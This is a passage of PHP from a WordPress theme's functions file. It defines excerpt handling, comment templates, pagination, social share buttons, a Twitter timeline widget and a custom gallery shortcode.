post excerpt
------------------------------------------- */

/* Excerpt custom length */
// if ( ! function_exists( 'asalah_excerpt_more' ) && ! is_admin() ) :
// function asalah_excerpt_more( $more ) {
//     if ( asalah_cross_option('asalah_post_excerpt_text')):
//         $excerpt_text = ' '.asalah_cross_option('asalah_post_excerpt_text').' ';
//     else:
//         $excerpt_text = ' &hellip; ';
//     endif;
//
// 	$more = sprintf( '<a href="%1$s" class="more_link more_link_dots">%2$s</a>', esc_url( get_permalink( get_the_ID() ) ), $excerpt_text );
// 	return $more;
// }
// add_filter( 'excerpt_more', 'asalah_excerpt_more', 999 );
// endif;

/* Excerpt more text */
function asalah_more_link($more_link, $more_link_text) {
	if ( asalah_cross_option('asalah_post_excerpt_text')):
			$excerpt_text = ' '.asalah_cross_option('asalah_post_excerpt_text').' ';
	else:
			$excerpt_text = ' &hellip; ';
	endif;

$more = sprintf( '<a href="%1$s" class="more_link more_link_dots">%2$s</a>', esc_url( get_permalink( get_the_ID() ) ), $excerpt_text );
return $more;
}
add_filter('the_content_more_link', 'asalah_more_link', 10, 2);


// excerpt custom length
if (!function_exists('asalah_excerpt_length')) {
 function asalah_excerpt_length($more) {
		$limit = 200;
		if (asalah_cross_option('asalah_post_excerpt_limit') != '') {
			$limit = asalah_cross_option('asalah_post_excerpt_limit');
		}
		return $limit;
	}
}
add_filter('excerpt_length', 'asalah_excerpt_length', 999);

// function used for excerpt with format
function asalah_custom_wp_trim_excerpt($text, $limit, $more) {
	$raw_excerpt = $text;
	if ( '' == $text ) {
    //Retrieve the post content.
    $text = get_the_content('');
 		$text = strip_shortcodes( $text );
    $text = apply_filters('the_content', $text);
    $text = str_replace(']]&gt;', ']]&gt;', $text);

    // the code below sets the excerpt length to 55 words. You can adjust this number for your own blog.
    $excerpt_length = $limit;

    // the code below sets what appears at the end of the excerpt, in this case ...
    $excerpt_more = $more;

    $words = preg_split("/[\n\r\t ]+/", $text, $excerpt_length + 1, PREG_SPLIT_NO_EMPTY);
    if ( count($words) || $excerpt_length ) {
        array_pop($words);
        $text = implode(' ', $words);
        $text = force_balance_tags( $text );
        $text = $text . $excerpt_more;
    } else {
        $text = implode(' ', $words);
    }

	}
	return apply_filters('wp_trim_excerpt', $text, $raw_excerpt);
}

// Default excerpt
if ( ! function_exists( 'asalah_excerpt' ) ) :
	function asalah_excerpt($limit) {

		if ( asalah_cross_option('asalah_post_excerpt_text')):
				$excerpt_text = ' '.asalah_cross_option('asalah_post_excerpt_text').' ';
		else:
				$excerpt_text = ' &hellip; ';
		endif;

	$more = '<a href="'.esc_url( get_permalink( get_the_ID() ) ).'" class="more_link more_link_dots">'.$excerpt_text.'</a>';
		$content = get_the_excerpt();
		return wp_trim_words($content, $limit, $more);

	}
endif;

// Excerpt with formatting
if ( ! function_exists( 'asalah_excerpt_with_format' ) ) :
	function asalah_excerpt_with_format($limit) {

		if ( asalah_cross_option('asalah_post_excerpt_text')):
				$excerpt_text = ' '.asalah_cross_option('asalah_post_excerpt_text').' ';
		else:
				$excerpt_text = ' &hellip; ';
		endif;

		$more = '<a href="'.esc_url( get_permalink( get_the_ID() ) ).'" class="more_link more_link_dots">'.$excerpt_text.'</a>';
		return asalah_custom_wp_trim_excerpt( '', $limit, $more );

	}
endif;



/* --------
author contact methods
------------------------------------------- */
if (!function_exists('asalah_change_contact_info')) {
	function asalah_change_contact_info($contactmethods) {
			// remove Wordpress defaults
	    unset($contactmethods['aim']);
	    unset($contactmethods['yim']);
	    unset($contactmethods['jabber']);
	    unset($contactmethods['url']);
	    unset($contactmethods['googleplus']);
			// Add new fields
	    $contactmethods['twitter'] = 'Twitter';
	    $contactmethods['facebook'] = 'Facebook';
	    $contactmethods['linkedin'] = 'Linked In';
	    $contactmethods['gplus'] = 'Google +';
	    $contactmethods['pinterest'] = 'Pinterest';
	    return $contactmethods;
	}
}
add_filter('user_contactmethods','asalah_change_contact_info',10,1);

/* --------
facebook comments
------------------------------------------- */
if ( ! function_exists('asalah_facebook_comment_intgrate')):
function asalah_facebook_comment_intgrate() {
		// check facebook comments option
    if ( asalah_option('asalah_enable_facebook_comments')):
            $facebook_app = asalah_get_fb_id();
						if (!$facebook_app) { return false;}
            $facebook_head_script = "<meta property='fb:app_id' content='".$facebook_app."' />";
            echo $facebook_head_script;
    else:
        return;
    endif;
};
endif;
add_action( 'wp_head', 'asalah_facebook_comment_intgrate' );

// Get facebook id, either from facebook comments section or from social settings section
if (! function_exists('asalah_get_fb_id')) {
	function asalah_get_fb_id()
	{
		// check Social seetings fb id
		if ( asalah_option('asalah_fb_id') != ""):
			return asalah_option('asalah_fb_id');

		// check facebook comments fb
		elseif ( asalah_option('asalah_facebook_app_id') != " "):
			if ( asalah_option('asalah_facebook_app_id') != " "):
				return asalah_option('asalah_facebook_app_id');
			endif;
		else:
			return false;
		endif;
	}
}

/* --------
post comments
------------------------------------------- */
if ( ! function_exists( 'asalah_comment' ) ) :
function asalah_comment($comment, $args, $depth) {
	if ($comment) {
		$GLOBALS['comment'] = $comment;
	}
  switch ($comment->comment_type) :
    case 'pingback' :
    case 'trackback' :
      ?>
      <li class="post pingback">
        <p><?php _e('Pingback: ', 'asalah'); ?> <?php comment_author_link(); ?> (<?php edit_comment_link(__('Edit', 'asalah'), '<span class="edit-link">', '</span>'); ?>)</p>
        <?php
    break;
    default :
			// set comment class
		 	$comment_class = "media the_comment";
			// start li and wordpress will close it
			?>
      <li <?php comment_class($comment_class); ?> id="comment-<?php comment_ID(); ?>">
				<?php // link to comment author url if exists
				if (get_comment_author_url() != '') {
				?>
					<a rel="nofollow" class="pull-left commenter" href="<?php echo get_comment_author_url(); ?>">
				<?php } else { ?>
					<div class="pull-left commenter">
				<?php } // end condition link to comment author url if exists

		      $avatar_size = 50;
		      echo get_avatar($comment, $avatar_size);
				// closing author tag
				if (get_comment_author_url() != '') { ?>
	        </a>
				<?php } else { ?>
					</div><!-- pull-left commenter -->
				<?php } ?>
	      <div class="media-body comment_body">
	      	<div class="comment_content_wrapper">
            <div class="media-heading clearfix">
                <b class="commenter_name title"><?php echo get_comment_author_link(); ?></b>
                <div class="comment_info">
									<a class="comment_time" href="<?php echo esc_url(get_comment_link($comment->comment_ID)); ?>"><time pubdate datetime="<?php echo get_comment_time('c'); ?>"><?php echo get_comment_date() . ' at ' . get_comment_time(); ?></time></a>
									<?php comment_reply_link(array_merge($args, array(
																																		'reply_text' => "- ".__('Reply', 'asalah'),
																																		'depth' => $depth, 'max_depth' => $args['max_depth']
																																		))); ?>
								</div><!-- comment_info -->
            </div><!-- end media-heading -->
						<?php
						comment_text();
						?>
					</div><!-- end comment_content_wrapper -->
					<?php // end comment_content_wrapper
    break;
  endswitch;
}
endif;

/* --------
comments nav
------------------------------------------- */
if ( ! function_exists( 'asalah_comment_nav' ) ) :
	function asalah_comment_nav() {
		// Are there comments to navigate through?
		if ( get_comment_pages_count() > 1 && get_option( 'page_comments' ) ) :
		?>
		<nav class="navigation comment-navigation clearfix" role="navigation">
			<h2 class="screen-reader-text"><?php _e( 'Comment navigation', 'asalah' ); ?></h2>
			<div class="nav-links">
				<?php
					if ( $prev_link = get_previous_comments_link( __( 'Older Comments', 'asalah' ) ) ) :
						printf( '<div class="comment-nav nav-previous">%s</div>', $prev_link );
					endif;

					if ( $next_link = get_next_comments_link( __( 'Newer Comments', 'asalah' ) ) ) :
						printf( '<div class="comment-nav nav-next">%s</div>', $next_link );
					endif;
				?>
			</div><!-- .nav-links -->
		</nav><!-- .comment-navigation -->
		<?php
		endif;
	}
endif;

/* --------
layout classes, sidebar and content classes
------------------------------------------- */
if ( ! function_exists( 'asalah_default_sidebar_class' ) ) :
	function asalah_default_sidebar_class() {

	    if (asalah_option("asalah_sidebar_position") == "left") {
	        $class = "col-md-3 pull-left";
	    } else {
	        $class = "col-md-3 pull-right";
	    }
	    return $class;
	}
endif;

if ( ! function_exists( 'asalah_default_content_class' ) ) :
	function asalah_default_content_class() {
	    // first check sidebar position option from option panel
			if (is_active_sidebar( 'sidebar-1' )) {
				// check if site width within limits
				if ((intval(asalah_option('asalah_site_width')) < 701) && (intval(asalah_option('asalah_site_width') > 499))) {
					$class = "col-md-12";

				} elseif (asalah_option("asalah_sidebar_position") == "left") {
		        $class = "col-md-9 pull-right";
		    } elseif (asalah_option("asalah_sidebar_position") == "none") {
		        $class = "col-md-12";
		    } else {
		        $class = "col-md-9 pull-left";
		    }
			} else {
				$class = "col-md-12";
			}

	    return $class;
	}
endif;

if ( ! function_exists( 'asalah_sidebar_class' ) ) :
	function asalah_sidebar_class($id = '') {
	    global $post;

	    if ($id == '') {
	        $id = $post->ID;
	    }

	    // first check sidebar position option from option panel
			if (asalah_cross_option("asalah_sidebar_position", $id) == "left") {
	        $class = "col-md-3 pull-left";
	    } else {
	        $class = "col-md-3 pull-right";
	    }


	    return $class;
	}
endif;

if ( ! function_exists( 'asalah_content_class' ) ) :
function asalah_content_class($id = '') {
    global $post;
    if ($id == '') {
        $id = $post->ID;
    }

    // first check sidebar position option from option panel
		if (is_active_sidebar( 'sidebar-1' )) {
			// check if site width within limits
			if ((intval(asalah_cross_option('asalah_site_width')) < 701) && (intval(asalah_cross_option('asalah_site_width') > 499))) {
				$class = "col-md-12";

			} elseif (asalah_cross_option("asalah_sidebar_position", $id) == "left") {
	        $class = "col-md-9 pull-right";
	    } elseif (asalah_cross_option("asalah_sidebar_position", $id) == "none") {
	        $class = "col-md-12";
	    } else {
	        $class = "col-md-9 pull-left";
	    }
		} else {
			$class = "col-md-12";
		}

    return $class;
}
endif;

/* --------
default blog style
------------------------------------------- */
if ( ! function_exists( 'asalah_blog_class' ) ) :
function asalah_blog_class($id = '') {
    global $post;
    if ($id == '') {
        $id = $post->ID;
    }
    $class = '';

		// add global blog style class if post option not set
		if (!asalah_post_option('asalah_blog_style')) {
			$class .= ' asalah_blog_global_setting';
		}
		// add blog style class
    if (asalah_cross_option('asalah_blog_style')) {
    	$class .= ' ' . asalah_cross_option('asalah_blog_style') . '_blog_style';
    }

		// add content width class
		if (asalah_cross_option('asalah_content_width_layout') == 'narrow') {
			$class .= ' narrow_content_width';
		}

    return $class;
}
endif;

/* --------
posts pagination
------------------------------------------- */
if ( ! function_exists( 'asalah_pagination' ) ) :
function asalah_pagination($id = '', $totalpages = '') {
    global $post;

    if ($post && $id == '') {
        $id = $post->ID;
    }

		// if post pagnation set to numbers
    if (asalah_cross_option('asalah_pagination_style', $id) == 'num') {

			// next and prev arrows
			$next_arrow = '<i class="fa fa-angle-right"></i>';
			$prev_arrow = '<i class="fa fa-angle-left"></i>';

			// reverse next and prev arrows if is rtl
			if ( is_rtl() ) {
				$next_arrow = '<i class="fa fa-angle-left"></i>';
				$prev_arrow = '<i class="fa fa-angle-right"></i>';
			}

			the_posts_pagination( array(
				'mid_size' => 2,
				'prev_text'          => $prev_arrow,
				'next_text'          => $next_arrow,
				'before_page_number' => '',
			) );

		// if page pagination is ajax
		} else if (asalah_cross_option('asalah_pagination_style', $id) == 'ajax') {
			// get global paged
	    global $paged;

			// use custom posts per page if set, else, use posts per page default option
			if (asalah_post_option('asalah_blog_page_posts_number', $id) != '') {
				$posts_per_page = asalah_post_option('asalah_blog_page_posts_number', $id);
			} else {
				$posts_per_page = get_option('posts_per_page');
			}

			// load if total pages more than 1 and next posts link exists
			if($totalpages > 1 && get_next_posts_link() ) {

				// if using WPML, load posts of same language only
				$my_current_lang = apply_filters( 'wpml_current_language', NULL );
        $lang_data = '';
        if ($my_current_lang != '') {
          $lang_data = 'data-lang="'.$my_current_lang.'"';
        }

				// start navigation button launcher div
				echo '<div class="navigation_links navigation_prev ajax_nav_container ajax_load_more" data-cycle="'.$paged.'" data-posttype="post" data-postsperpage="'.$posts_per_page.'" data-loopfile="content.php" data-totalpages="'.$totalpages.'" data-loaderimage="'.get_template_directory_uri().'/images/loader.gif" '.$lang_data.'" data-pageid="'.$id.'">';
				next_posts_link(__("Load More", "asalah"));
				echo '</div><div class="hidden ajax_data_helper" data-newtotalpages="'.$totalpages.'" ></div>';
				// end navigation button launcher div

			}

		// if none of the above, use next/prev pagination
		} else {

			// next posts link
    	if ( get_next_posts_link() ):
				echo '<div class="navigation_links navigation_next">';
					next_posts_link(__('Older Posts', 'asalah'));
				echo '</div>';
			endif;

			// previous posts link
			if ( get_previous_posts_link() ):
				echo '<div class="navigation_links navigation_prev">';
					previous_posts_link(__('Newer Posts', 'asalah'));
				echo '</div>';
			endif;
    }
}
endif;

/*---------
Custom Background and header
---------------------------------------------*/
add_theme_support('custom-background');
add_theme_support( "custom-header");

/* --------
post share
------------------------------------------- */
if ( ! function_exists( 'asalah_post_share' ) ) :
	function asalah_post_share() {
	        ?>
	        <div class="blog_post_control_item blog_post_share<?php if (asalah_option('asalah_show_share_effect') == 'always') { echo ' always_show';}?>">
	        	<span class="share_item share_sign"><i class="fa fa-share <?php if (is_rtl()) { echo 'fa-flip-horizontal';} ?>"></i></span>

						<?php if (asalah_cross_option('asalah_facebook_share') != 'no') { ?>
	        	<span class="social_share_item_wrapper"><a rel="nofollow" href="https://www.facebook.com/sharer/sharer.php?u=<?php the_permalink(); ?>" class="share_item share_item_social share_facebook" onclick="window.open('https://www.facebook.com/sharer/sharer.php?u=<?php the_permalink(); ?>', 'facebook-share-dialog', 'width=626,height=436');
	                                return false;"><i class="fa fa-facebook"></i></a></span>
						<?php } ?>

						<?php if (asalah_cross_option('asalah_twitter_share') != 'no') { ?>
	        	<span class="social_share_item_wrapper"><a rel="nofollow" href="https://twitter.com/share?url=<?php the_permalink(); ?>" target="_blank" class="share_item share_item_social share_twitter"><i class="fa fa-twitter"></i></a></span>
						<?php } ?>

						<?php if (asalah_cross_option('asalah_gplus_share') != 'no') { ?>
	        	<span class="social_share_item_wrapper"><a rel="nofollow" href="https://plus.google.com/share?url=<?php the_permalink(); ?>" onclick="javascript:window.open(this.href,
	                                        '', 'menubar=no,toolbar=no,resizable=yes,scrollbars=yes,height=600,width=600');
	                                return false;" class="share_item share_item_social share_googleplus"><i class="fa fa-google-plus"></i></a></span>
						<?php } ?>

						<?php if (asalah_cross_option('asalah_linkedin_share') != 'no') {?>
	        	<span class="social_share_item_wrapper"><a rel="nofollow" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=<?php the_permalink(); ?>" target="_blank" class="share_item share_item_social share_linkedin"><i class="fa fa-linkedin"></i></a></span>
						<?php } ?>

						<?php if (asalah_cross_option('asalah_pinterest_share') != 'no') {
							$image_url = '';
							if (has_post_thumbnail() ) {
								$image_url = wp_get_attachment_image_src( get_post_thumbnail_id(), 'full' );
								$image_url = $image_url[0];
							}

							$pinterest_title = str_replace(' ', '%20', get_the_title() );
							$pinterest_media = '';
							$pinterest_media_sep = '';
							if ($image_url != '') {
								$pinterest_media_sep = '&amp;media=';
								$pinterest_media =  $image_url;
							}
						?>
	        	<span class="social_share_item_wrapper"><a rel="nofollow" href="https://www.pinterest.com/pin/create/button/?url=<?php the_permalink(); ?><?php echo esc_attr($pinterest_media_sep) . esc_url($pinterest_media); ?>&amp;description=<?php echo esc_attr($pinterest_title); ?>" class="share_item share_item_social share_pinterest" target="_blank"><i class="fa fa-pinterest"></i></a></span>
						<?php } ?>

						<?php if (asalah_cross_option('asalah_reddit_share') == 'yes') { ?>
						<span class="social_share_item_wrapper"><a rel="nofollow" href="https://reddit.com/submit?url=<?php the_permalink(); ?>" class="share_item share_item_social share_reddit" target="_blank"><i class="fa fa-reddit"></i></a></span>
						<?php } ?>

						<?php if (asalah_cross_option('asalah_tumblr_share') == 'yes') { ?>
						<span class="social_share_item_wrapper"><a rel="nofollow" href="https://www.tumblr.com/share/link?url=<?php the_permalink(); ?>" class="share_item share_item_social share_tumblr" target="_blank"><i class="fa fa-tumblr"></i></a></span>
						<?php } ?>

						<?php if (asalah_cross_option('asalah_vk_share') == 'yes') { ?>
	        	<span class="social_share_item_wrapper"><a rel="nofollow" href="https://vk.com/share.php?url=<?php the_permalink(); ?>" class="share_item share_item_social share_vk" target="_blank"><i class="fa fa-vk"></i></a></span>
						<?php } ?>

						<?php if (asalah_cross_option('asalah_pocket_share') == 'yes') { ?>
						<span class="social_share_item_wrapper"><a class="share_item share_item_social share_pinterest" href="https://getpocket.com/save?url=<?php the_permalink(); ?>&title=<?php echo $pinterest_title; ?>" data-event-category="Social" data-event-action="Share:pocket"><i class="fa fa-get-pocket"></i></a></span>
						<?php } ?>

						<?php if (asalah_cross_option('asalah_stumbleupon_share') == 'yes') { ?>
						<span class="social_share_item_wrapper"><a class="share_item share_item_social share_stumbleupon" onclick="javascript:window.open('http://www.stumbleupon.com/badge/?url=<?php the_permalink(); ?>');void(0);" href="javascript:void(0);" target="_blank"><i class="fa fa-stumbleupon"></i></a></span>
						<?php } ?>

						<?php if (asalah_cross_option('asalah_whatsapp_share') == 'yes') { ?>
						<span class="social_share_item_wrapper"><a class="share_item share_item_social share_whatsapp" href="whatsapp://send?text=<?php the_permalink(); ?>" data-action="share/whatsapp/share"><i class="fa fa-whatsapp"></i></a></span>
						<?php } ?>

						<?php if (asalah_cross_option('asalah_telegram_share') == 'yes') { ?>
						<span class="social_share_item_wrapper"><a class="share_item share_item_social share_telegram" href="https://t.me/share/url?url=<?php the_permalink(); ?>"><i class="fa fa-telegram"></i></a></span>
						<?php } ?>

						<?php if (asalah_cross_option('asalah_mail_share') == 'yes') { ?>
						<span class="social_share_item_wrapper"><a class="share_item share_item_social share_mail" href="mailto:?body=<?php the_permalink(); ?>"><i class="fa fa-envelope"></i></a></span>
						<?php } ?>

						<?php if (asalah_cross_option('asalah_print_share') == 'yes') { ?>
						<span class="social_share_item_wrapper"><a class="share_item share_item_social share_print" href="javascript:window.print()"><i class="fa fa-print"></i></a></span>
						<?php } ?>

	        </div><!-- blog_post_control_item blog_post_share -->
	        <?php
	}
endif;

/* --------
get plog posts list
------------------------------------------- */
if ( ! function_exists( 'asalah_return_blogposts_list' ) ) :
	function asalah_return_blogposts_list($num = "3", $thumb = 'thumbnail', $orderby = 'date', $cat = '', $tag_ids = '') {
	    global $post;

	    $args = array('posts_per_page' => $num);
			if ($orderby == 'most_views') {
				$args['orderby'] = 'meta_value_num';
				$args['meta_key'] = 'hits';
			} else {
				$args['orderby'] = $orderby;
			}

	    if ($tag_ids != '') {
	        $tags = explode(',', $tag_ids);
	        $tags_array = array();
	        if (count($tags) > 0) {
	            foreach ($tags as $tag) {
	                if (!empty($tag)) {
	                    $tags_array[] = $tag;
	                }
	            }
	        }
	        $args['tag_slug__in'] = $tags_array;
	    }
			if ($cat != '') {
	    $box_cat = get_category_by_slug($cat);
	    if ($box_cat) {
	      $cat = $box_cat->term_id;
	      $args['cat'] = $cat;
	    }
	  }
	    $wp_query = new WP_Query($args);

	    $output = '';
	    if ($wp_query->have_posts()) :
	        $output .= '<ul class="post_list">';
	        while ($wp_query->have_posts()) : $wp_query->the_post();
	            $output .= '<li class="post_item clearfix">';

	                $output .= '<div class="post_thumbnail_wrapper">';
	                	$output .= '<a href="' . get_permalink() . '" title="' . get_the_title() . '">';
	                		if (!has_post_thumbnail()) {
	                			$post_title = get_the_title();
	                			$output .= '<span class="post_text_thumbnail title">'.mb_substr($post_title, 0, 1,"utf-8").'</span>';
	                		}else{
	                			$output .= get_the_post_thumbnail($post->ID, $thumb, array('class' => 'img-responsive'));
	                		}
	                	$output .= '</a>';
	                $output .= '</div>'; // end post_thumbnail_wrapper

		            $output .= '<div class="post_info_wrapper">';
			            $output .= '<h5 class="title post_title"><a href="' . get_permalink() . '" title="' . get_the_title() . '">' . get_the_title() . '</a></h5>';

			            $output .= '<span class="post_meta_item post_meta_time post_time">' . get_the_time(get_option('date_format')) . '</span>';
		            $output .= '</div>'; // end post_info_wrapper
	            $output .= '</li>'; // end post_item
	        endwhile;
	        $output .= '</ul>';
	    endif;
	    return $output;
	}
endif;

/* --------
asalah latest tweets widget
------------------------------------------- */
if ( ! function_exists( 'asalah_twitter_tweets' ) ) :
function asalah_twitter_tweets($consumerkey = '', $consumersecret = '', $accesstoken = '', $accesstokensecret = '', $screenname = '', $tweets_count = 2, $include_media = false, $extend_tweet = false, $exclude_replies = false) {
    if (empty($consumerkey) || empty($consumersecret) || empty($accesstokensecret) || empty($accesstoken)) {
        return __('Your twitter application info is not set correctly in option panel, please create please login to Twitter Application Manager here https://apps.twitter.com/ , create new application and new access token, then go to theme customizer social section and fill the data you got from Twitter application', 'asalah');
    } else {
        $twitter = new pencilTwitterOAuth($consumerkey, $consumersecret, $accesstoken, $accesstokensecret);

				$args = array();
				if ($screenname != '') {
					$args['screen_name'] = $screenname;
				}
				if ($tweets_count != '') {
					$args['count'] = $tweets_count;
				}
				if ($extend_tweet) {
					$args['tweet_mode'] = 'extended';
				}
				if ($exclude_replies) {
					$args['exclude_replies'] = 'true';
				}
        $tweets = $twitter->request('statuses/user_timeline','GET', $args);
        $output = '';

        if (is_array($tweets) && !isset($tweets->errors)) {
            $i = 0;
            $lnk_msg = NULL;

            $output .= "<ul>";
            foreach ($tweets as $tweet) {

                $lnk_page = 'https://twitter.com/' . $screenname;
                $page_name = $tweet->user->name;

								// get full text if extended, or text if default
								if (isset($tweet->full_text)) {
										$msg = $tweet->full_text;
								} else {
									$msg = $tweet->text;
								}

                if (is_array($tweet->entities->urls)) {
                    try {
                        if (array_key_exists('0', $tweet->entities->urls)) {
                            $lnk_msg = $tweet->entities->urls[0]->url;
                        } else {
                            $lnk_msg = NULL;
                        }
                    } catch (Exception $e) {
                        $lnk_msg = NULL;
                    }
                }

								// tweet link
                $lnk_tweet = 'http://twitter.com/' . $screenname . '/status/' . $tweet->id_str;

                /* Tweet Time */
                $time = strtotime($tweet->created_at);
                $delta = abs(time() - $time); /* in seconds */
                $result = '';
                if ($delta < 1) {
                    $result = ' just now';
                } elseif ($delta < 60) {
                    $result = $delta . ' seconds ago';
                } elseif ($delta < 120) {
                    $result = ' about a minute ago';
                } elseif ($delta < (45 * 60)) {
                    $result = ' about ' . round(($delta / 60), 0) . ' minutes ago';
                } elseif ($delta < (2 * 60 * 60)) {
                    $result = ' about an hour ago';
                } elseif ($delta < (24 * 60 * 60)) {
                	$timetext = sprintf( _n( 'an hour', '%s hours', round(($delta / 3600), 0), 'asalah' ), round(($delta / 3600), 0)) ;
                    $result = ' about ' . $timetext . ' ago';
                } elseif ($delta < (48 * 60 * 60)) {
                    $result = ' about a day ago';
                } elseif ($delta > (48 * 60 * 60) && $delta < (24 * 60 * 60 * 30)) {
                	$timetext = sprintf( _n( 'a day', '%s days', round(($delta / 86400), 0), 'asalah' ), round(($delta / 86400), 0)) ;
                	$result = ' about ' . $timetext . ' ago';
                } elseif ($delta > (24 * 60 * 60 * 30) && $delta < (24 * 60 * 60 * 30 * 12)) {
                	$timetext = sprintf( _n( 'a month', '%s months', round(($delta / 2592000), 0), 'asalah' ), round(($delta / 2592000), 0)) ;
                	$result = ' about ' . $timetext . ' ago';
                } elseif ($delta > (24 * 60 * 60 * 30 * 12)) {
                	$timetext = sprintf( _n( 'a year', '%s years', round(($delta / 31104000), 0), 'asalah' ), round(($delta / 25920000), 0)) ;
                	$result = ' about ' . $timetext . ' ago';
                }
								// Add images attached to tweet if existed
								if ($include_media) {
									if (isset($tweet->entities->media)) {
											if (array_key_exists('0', $tweet->entities->media)) {
												$img = $tweet->entities->media[0]->media_url_https;
												if (isset($tweet->entities->media[0]->url)) {
													$img_link = $tweet->entities->media[0]->url;
												} else {
													$img_link = $lnk_tweet;
												}
											}
									} else {
										$img = '';
									}
								}

                if ($i >= $tweets_count)
                    break;


                $output .= '<li class="tweet-item">';
                $output .= '<a rel="nofollow" target="_blank" href="' . $lnk_tweet . '" class="tweet_icon"><i class="fa fa-twitter"></i></a>';
                $output .= '<a target="_blank" class="tweet_name" href="' . $lnk_tweet . '">' . $page_name . '</a> ';

                $output .= '<span class="tweet_text">';
                $output .= asalah_make_clickable($msg);
								if (isset($img) && $img != '') {
									$output .= '<a href="'.$img_link.'" target="_blank">';
										$output .= '<img src="'.$img.'" />';
									$output .= '</a>';
								}
                $output .= '</span>';

                $output .= '<div class="tweet_control">';
	                $output .= '<a rel="nofollow" href="' . $lnk_tweet . '" target="_blank" class="tweet_time">' . $result . '</a>';

	                $output .= '<span class="tweet_links">';
	                $output .= '<a class="tweet_link tweet_link_reply" href="http://twitter.com/intent/tweet?in_reply_to='.$tweet->id_str.'"><i class="fa fa-reply"></i></a>';
	                $output .= '<a class="tweet_link tweet_link_retweet" href="http://twitter.com/intent/retweet?tweet_id='.$tweet->id_str.'"><i class="fa fa-retweet"></i></a>';
	                $output .= '<a class="tweet_link tweet_link_retweet" href="http://twitter.com/intent/favorite?tweet_id='.$tweet->id_str.'"><i class="fa fa-star"></i></a>';
	                $output .= '</span>';
                $output .= '</div>'; // end tweet_control

	            $output .= '</li>';


              $i++;
            } /* foreach */

            $output .= "</ul>";
            $output .= '<script>window.twttr=(function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],t=window.twttr||{};if(d.getElementById(id))return;js=d.createElement(s);js.id=id;js.src="https://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);t._e=[];t.ready=function(f){t._e.push(f);};return t;}(document,"script","twitter-wjs"));</script>';

            if (!empty($output)) {
                return $output;
            }
        } else {
            if (isset($tweets->errors)):
                $output .= '<span class="tweet_error">Message: ' . $tweets->errors[0]->message . ', Please check your Twitter Authentication Data or internet connection.</span>';
            else:
                $output .= '<span class="tweet_error">Please check your internet connection.</span>';
            endif;

            if (!empty($output)) {
                return $output;
            }
        }
    }
}
endif;

/* --------
asalah wordpress gallery
------------------------------------------- */
// check if jetpack exists
if ( !(class_exists( 'Jetpack' ) && Jetpack::is_module_active( 'carousel' ))) {
	remove_shortcode('gallery');
}

if ( ! function_exists( 'asalah_gallery_shortcode' ) && !( class_exists( 'Jetpack' ) && Jetpack::is_module_active( 'carousel' ))) :
function asalah_gallery_shortcode( $attr ) {

		$post = get_post();
    static $instance = 0;
    $instance++;

    if ( ! empty( $attr['ids'] ) ) {
        // 'ids' is explicitly ordered, unless you specify otherwise.
        if ( empty( $attr['orderby'] ) ) {
            $attr['orderby'] = 'post__in';
        }
        $attr['include'] = $attr['ids'];
    }

    /**
     * Filter the default gallery shortcode output.
     *
     * If the filtered output isn't empty, it will be used instead of generating
     * the default gallery template.
     *
     * @since 2.5.0
     *
     * @see gallery_shortcode()
     *
     * @param string $output The gallery output. Default empty.
     * @param array  $attr   Attributes of the gallery shortcode.
     */
    $output = apply_filters( 'post_gallery', '', $attr );
    if ( $output != '' ) {
        return $output;
    }

    $html5 = current_theme_supports( 'html5', 'gallery' );
    $atts = shortcode_atts( array(
        'order'      => 'ASC',
        'orderby'    => 'menu_order ID',
        'id'         => $post ? $post->ID : 0,
        'itemtag'    => $html5 ? 'figure'     : 'dl',
        'icontag'    => $html5 ? 'div'        : 'dt',
        'captiontag' => $html5 ? 'figcaption' : 'dd',
        'columns'    => 3,
        'size'       => 'thumbnail',
        'include'    => '',
        'exclude'    => '',
        'link'       => '',
        'type' => '', // this attribute has been added for post_foramts only
        'format_size' => 'full_blog', // this attribute has been added for post_foramts only
    ), $attr, 'gallery' );
    $format_size = $atts['format_size'];
    $id = intval( $atts['id'] );

    if ( ! empty( $atts['include'] ) ) {
        $_attachments = get_posts( array( 'include' => $atts['include'], 'post_status' => 'inherit', 'post_type' => 'attachment', 'post_mime_type' => 'image', 'order' => $atts['order'], 'orderby' => $atts['orderby'] ) );

        $attachments = array();
        foreach ( $_attachments as $key => $val ) {
            $attachments[$val->ID] = $_attachments[$key];
        }
    } elseif ( ! empty( $atts['exclude'] ) ) {
        $attachments = get_children( array( 'post_parent' => $id, 'exclude' => $atts['exclude'], 'post_status' => 'inherit', 'post_type' => 'attachment', 'post_mime_type' => 'image', 'order' => $atts['order'], 'orderby' => $atts['orderby'] ) );
    } else {
        $attachments = get_children( array( 'post_parent' => $id, 'post_status' => 'inherit', 'post_type' => 'attachment', 'post_mime_type' => 'image', 'order' => $atts['order'], 'orderby' => $atts['orderby'] ) );
    }

    if ( empty( $attachments ) ) {
        return '';
    }

    if ( is_feed() ) {
        $output = "\n";
        foreach ( $attachments as $att_id => $attachment ) {
            $output .= wp_get_attachment_link( $att_id, $atts['size'], true ) . "\n";
        }
        return $output;
    }

    $itemtag = tag_escape( $atts['itemtag'] );
    $captiontag = tag_escape( $atts['captiontag'] );
    $icontag = tag_escape( $atts['icontag'] );
    $valid_tags = wp_kses_allowed_html( 'post' );
    if ( ! isset( $valid_tags[ $itemtag ] ) ) {
        $itemtag = 'dl';
    }
    if ( ! isset( $valid_tags[ $captiontag ] ) ) {
        $captiontag = 'dd';
    }
    if ( ! isset( $valid_tags[ $icontag ] ) ) {
        $icontag = 'dt';
    }

    $columns = intval( $atts['columns'] );
    $itemwidth = $columns > 0 ? floor(100/$columns) : 100;
    $float = is_rtl() ? 'right' : 'left';

    $selector = "gallery-{$instance}";

    $gallery_style = '';

    /**
     * Filter whether to print default gallery styles.
     *
     * @since 3.1.0
     *
     * @param bool $print Whether to print default gallery styles.
     *                    Defaults to false if the theme supports HTML5 galleries.
     *                    Otherwise, defaults to true.
     */
    if ( apply_filters( 'use_default_gallery_style', ! $html5 ) ) {
        $gallery_style = "
        <style type='text/css'>
            #{$selector} {
                margin: auto;
            }
            #{$selector} .gallery-item {
                float: {$float};
                margin-top: 10px;
                text-align: center;
                width: {$itemwidth}%;
            }
            #{$selector} img {
                border: 2px solid #cfcfcf;
            }
            #{$selector} .gallery-caption {
                margin-left: 0;
            }
            /* see gallery_shortcode() in wp-includes/media.php */
        </style>\n\t\t";
    }

    $size_class = sanitize_html_class( $atts['size'] );
    $wrapper_class = 'filterable_grid';
